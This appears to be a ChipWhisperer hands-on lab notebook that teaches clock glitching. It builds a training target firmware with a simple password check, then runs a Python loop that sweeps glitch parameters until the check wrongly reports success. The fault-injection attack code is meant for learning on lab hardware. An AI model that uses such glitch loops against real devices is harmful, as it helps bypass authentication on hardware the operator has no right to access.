Part 1, Topic 2: Clock Glitching to Bypass Password
===================================================



**SUMMARY:** *In the previous lab, we learned how clock glitching can be
used to cause a target to behave unexpectedly. In this lab, we’ll look
at a slightly more realistic example - glitching past a password check*

**LEARNING OUTCOMES:**

-  Applying previous glitch settings to new firmware
-  Checking for success and failure when glitching

Firmware
--------

We’ve already seen how we can insert clock gliches to mess up a
calculation that a target is trying to make. While this has many
applications, some which will be covered in Fault_201, let’s take a look
at something a little closer to our original example of glitch
vulnerable code: a password check. No need to change out firmware here,
we’re still using the simpleserial-glitch project (though we’ll go
through all the build stuff again).

The code is as follows for the password check:

.. code:: c

   uint8_t password(uint8_t* pw)
   {
       char passwd[] = "touch";
       char passok = 1;
       int cnt;

       trigger_high();

       //Simple test - doesn't check for too-long password!
       for(cnt = 0; cnt < 5; cnt++){
           if (pw[cnt] != passwd[cnt]){
               passok = 0;
           }
       }
       
       trigger_low();
       
       simpleserial_put('r', 1, (uint8_t*)&passok);
       return passok;
   }

There’s really nothing out of the ordinary here - it’s just a simple
password check. We can communicate with it using the ``'p'`` command.


**In [1]:**

.. code:: ipython3

    SCOPETYPE = 'OPENADC'
    PLATFORM = 'CWLITEXMEGA'


**In [2]:**

.. code:: bash

    %%bash -s "$PLATFORM"
    cd ../../../hardware/victims/firmware/simpleserial-glitch
    make PLATFORM=$1 CRYPTO_TARGET=NONE


**Out [2]:**



.. parsed-literal::

    SS\_VER set to SS\_VER\_1\_1
    rm -f -- simpleserial-glitch-CWLITEXMEGA.hex
    rm -f -- simpleserial-glitch-CWLITEXMEGA.eep
    rm -f -- simpleserial-glitch-CWLITEXMEGA.cof
    rm -f -- simpleserial-glitch-CWLITEXMEGA.elf
    rm -f -- simpleserial-glitch-CWLITEXMEGA.map
    rm -f -- simpleserial-glitch-CWLITEXMEGA.sym
    rm -f -- simpleserial-glitch-CWLITEXMEGA.lss
    rm -f -- objdir/\*.o
    rm -f -- objdir/\*.lst
    rm -f -- simpleserial-glitch.s simpleserial.s XMEGA\_AES\_driver.s uart.s usart\_driver.s xmega\_hal.s
    rm -f -- simpleserial-glitch.d simpleserial.d XMEGA\_AES\_driver.d uart.d usart\_driver.d xmega\_hal.d
    rm -f -- simpleserial-glitch.i simpleserial.i XMEGA\_AES\_driver.i uart.i usart\_driver.i xmega\_hal.i
    .
    Welcome to another exciting ChipWhisperer target build!!
    avr-gcc.exe (WinAVR 20100110) 4.3.3
    Copyright (C) 2008 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.  There is NO
    warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
    
    .
    Compiling C: simpleserial-glitch.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS\_VER=SS\_VER\_1\_1 -DHAL\_TYPE=HAL\_xmega -DPLATFORM=CWLITEXMEGA -DF\_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-glitch.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial-glitch.o.d simpleserial-glitch.c -o objdir/simpleserial-glitch.o 
    .
    Compiling C: .././simpleserial/simpleserial.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS\_VER=SS\_VER\_1\_1 -DHAL\_TYPE=HAL\_xmega -DPLATFORM=CWLITEXMEGA -DF\_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial.o.d .././simpleserial/simpleserial.c -o objdir/simpleserial.o 
    .
    Compiling C: .././hal/xmega/XMEGA\_AES\_driver.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS\_VER=SS\_VER\_1\_1 -DHAL\_TYPE=HAL\_xmega -DPLATFORM=CWLITEXMEGA -DF\_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/XMEGA\_AES\_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/XMEGA\_AES\_driver.o.d .././hal/xmega/XMEGA\_AES\_driver.c -o objdir/XMEGA\_AES\_driver.o 
    .
    Compiling C: .././hal/xmega/uart.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS\_VER=SS\_VER\_1\_1 -DHAL\_TYPE=HAL\_xmega -DPLATFORM=CWLITEXMEGA -DF\_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/uart.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/uart.o.d .././hal/xmega/uart.c -o objdir/uart.o 
    .
    Compiling C: .././hal/xmega/usart\_driver.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS\_VER=SS\_VER\_1\_1 -DHAL\_TYPE=HAL\_xmega -DPLATFORM=CWLITEXMEGA -DF\_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/usart\_driver.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/usart\_driver.o.d .././hal/xmega/usart\_driver.c -o objdir/usart\_driver.o 
    .
    Compiling C: .././hal/xmega/xmega\_hal.c
    avr-gcc -c -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS\_VER=SS\_VER\_1\_1 -DHAL\_TYPE=HAL\_xmega -DPLATFORM=CWLITEXMEGA -DF\_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/xmega\_hal.lst -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/xmega\_hal.o.d .././hal/xmega/xmega\_hal.c -o objdir/xmega\_hal.o 
    .
    Linking: simpleserial-glitch-CWLITEXMEGA.elf
    avr-gcc -mmcu=atxmega128d3 -I. -fpack-struct -gdwarf-2 -DSS\_VER=SS\_VER\_1\_1 -DHAL\_TYPE=HAL\_xmega -DPLATFORM=CWLITEXMEGA -DF\_CPU=7372800UL -Os -funsigned-char -funsigned-bitfields -fshort-enums -Wall -Wstrict-prototypes -Wa,-adhlns=objdir/simpleserial-glitch.o -I.././simpleserial/ -I.././hal -I.././hal/xmega -I.././crypto/ -std=gnu99  -MMD -MP -MF .dep/simpleserial-glitch-CWLITEXMEGA.elf.d objdir/simpleserial-glitch.o objdir/simpleserial.o objdir/XMEGA\_AES\_driver.o objdir/uart.o objdir/usart\_driver.o objdir/xmega\_hal.o --output simpleserial-glitch-CWLITEXMEGA.elf -Wl,-Map=simpleserial-glitch-CWLITEXMEGA.map,--cref   -lm  
    .
    Creating load file for Flash: simpleserial-glitch-CWLITEXMEGA.hex
    avr-objcopy -O ihex -R .eeprom -R .fuse -R .lock -R .signature simpleserial-glitch-CWLITEXMEGA.elf simpleserial-glitch-CWLITEXMEGA.hex
    .
    Creating load file for EEPROM: simpleserial-glitch-CWLITEXMEGA.eep
    avr-objcopy -j .eeprom --set-section-flags=.eeprom="alloc,load" \
    --change-section-lma .eeprom=0 --no-change-warnings -O ihex simpleserial-glitch-CWLITEXMEGA.elf simpleserial-glitch-CWLITEXMEGA.eep \|\| exit 0
    .
    Creating Extended Listing: simpleserial-glitch-CWLITEXMEGA.lss
    avr-objdump -h -S -z simpleserial-glitch-CWLITEXMEGA.elf > simpleserial-glitch-CWLITEXMEGA.lss
    .
    Creating Symbol Table: simpleserial-glitch-CWLITEXMEGA.sym
    avr-nm -n simpleserial-glitch-CWLITEXMEGA.elf > simpleserial-glitch-CWLITEXMEGA.sym
    Size after:
       text	   data	    bss	    dec	    hex	filename
       2288	     22	     52	   2362	    93a	simpleserial-glitch-CWLITEXMEGA.elf
    +--------------------------------------------------------
    + Default target does full rebuild each time.
    + Specify buildtarget == allquick == to avoid full rebuild
    +--------------------------------------------------------
    +--------------------------------------------------------
    + Built for platform CW-Lite XMEGA with:
    + CRYPTO\_TARGET = NONE
    + CRYPTO\_OPTIONS = 
    +--------------------------------------------------------
    



**In [3]:**

.. code:: ipython3

    %run "../../Setup_Scripts/Setup_Generic.ipynb"


**Out [3]:**



.. parsed-literal::

    Serial baud rate = 38400
    INFO: Found ChipWhisperer😍
    



**In [4]:**

.. code:: ipython3

    fw_path = "../../../hardware/victims/firmware/simpleserial-glitch/simpleserial-glitch-{}.hex".format(PLATFORM)
    cw.program_target(scope, prog, fw_path)


**Out [4]:**



.. parsed-literal::

    XMEGA Programming flash...
    XMEGA Reading flash...
    Verified flash OK, 2309 bytes
    



**In [5]:**

.. code:: ipython3

    if PLATFORM == "CWLITEXMEGA":
        def reboot_flush():            
            scope.io.pdic = False
            time.sleep(0.1)
            scope.io.pdic = "high_z"
            time.sleep(0.1)
            #Flush garbage too
            target.flush()
    else:
        def reboot_flush():            
            scope.io.nrst = False
            time.sleep(0.05)
            scope.io.nrst = "high_z"
            time.sleep(0.05)
            #Flush garbage too
            target.flush()

If we send a wrong password:


**In [6]:**

.. code:: ipython3

    #Do glitch loop
    pw = bytearray([0x00]*5)
    target.simpleserial_write('p', pw)
    
    val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
    valid = val['valid']
    if valid:
        response = val['payload']
        raw_serial = val['full_response']
        error_code = val['rv']
    
    print(val)


**Out [6]:**



.. parsed-literal::

    {'valid': True, 'payload': CWbytearray(b'00'), 'full\_response': 'r00\n', 'rv': 0}
    


We get a resposne of zero. But if we send the correct password:


**In [7]:**

.. code:: ipython3

    #Do glitch loop
    pw = bytearray([0x74, 0x6F, 0x75, 0x63, 0x68]) # correct password ASCII representation
    target.simpleserial_write('p', pw)
    
    val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
    valid = val['valid']
    if valid:
        response = val['payload']
        raw_serial = val['full_response']
        error_code = val['rv']
    
    print(val)


**Out [7]:**



.. parsed-literal::

    {'valid': True, 'payload': CWbytearray(b'01'), 'full\_response': 'r01\n', 'rv': 1}
    


We get a 1 back. Set the glitch up as in the previous part:


**In [8]:**

.. code:: ipython3

    scope.glitch.clk_src = 'clkgen'
    scope.glitch.trigger_src = 'ext_single'
    scope.glitch.repeat = 1
    scope.glitch.output = "clock_xor"
    scope.io.hs2 = "glitch"

Update the code below to also add an ext offset parameter:


**In [9]:**

.. code:: ipython3

    import matplotlib.pylab as plt
    import chipwhisperer.common.results.glitch as glitch
    gc = glitch.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset"])
    gc.display_stats()


**Out [9]:**













And make a glitch loop. Make sure you use some successful settings that
you found in the previous lab, since it will make this one much shorter!

One change you probably want to make is to add a scan for ext_offset.
The number of places we can insert a successful glitch has gone way
down. Doing this will also be very important for future labs.


**In [10]:**

.. code:: ipython3

    from importlib import reload
    import chipwhisperer.common.results.glitch as glitch
    from tqdm.notebook import tqdm
    import re
    import struct
    
    gc.set_range("width", 2, 14)
    gc.set_range("offset", -14, 14)
    gc.set_range("ext_offset", 11, 31)
    if PLATFORM == "CWLITEXMEGA":
        gc.set_range("width", 46, 49.8)
        gc.set_range("offset", -46, -49.8)
    step = 1
    gc.set_global_step(step)
    scope.glitch.repeat = 1
    reboot_flush()
    broken = False
    
    for glitch_settings in gc.glitch_values():
        scope.glitch.offset = glitch_settings[1]
        scope.glitch.width = glitch_settings[0]
        scope.glitch.ext_offset = glitch_settings[2]
        if scope.adc.state:
            # can detect crash here (fast) before timing out (slow)
            print("Trigger still high!")
            gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
            #plt.plot(lwid, loff, 'xr', alpha=1)
            #fig.canvas.draw()
    
            #Device is slow to boot?
            reboot_flush()
    
        scope.arm()
        target.simpleserial_write('p', bytearray([0]*5))
    
        ret = scope.capture()
    
        val = target.simpleserial_read_witherrors('r', 1, glitch_timeout=10)#For loop check
        if ret:
            print('Timeout - no trigger')
            gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
    
            #Device is slow to boot?
            reboot_flush()
    
        else:
            if val['valid'] is False:
                gc.add("reset", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
                #plt.plot(scope.glitch.width, scope.glitch.offset, 'xr', alpha=1)
                #fig.canvas.draw()
            else:
                if val['rv'] == 1: #for loop check
                    broken = True
                    gc.add("success", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))
                    print(val['payload'])
                    print(scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset)
                    print("🐙", end="")
                else:
                    gc.add("normal", (scope.glitch.width, scope.glitch.offset, scope.glitch.ext_offset))


**Out [10]:**



.. parsed-literal::

    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    




.. parsed-literal::

    Trigger still high!
    




.. parsed-literal::

    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    




.. parsed-literal::

    Trigger still high!
    




.. parsed-literal::

    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
    WARNING:root:Negative offsets <-45 may result in double glitches!
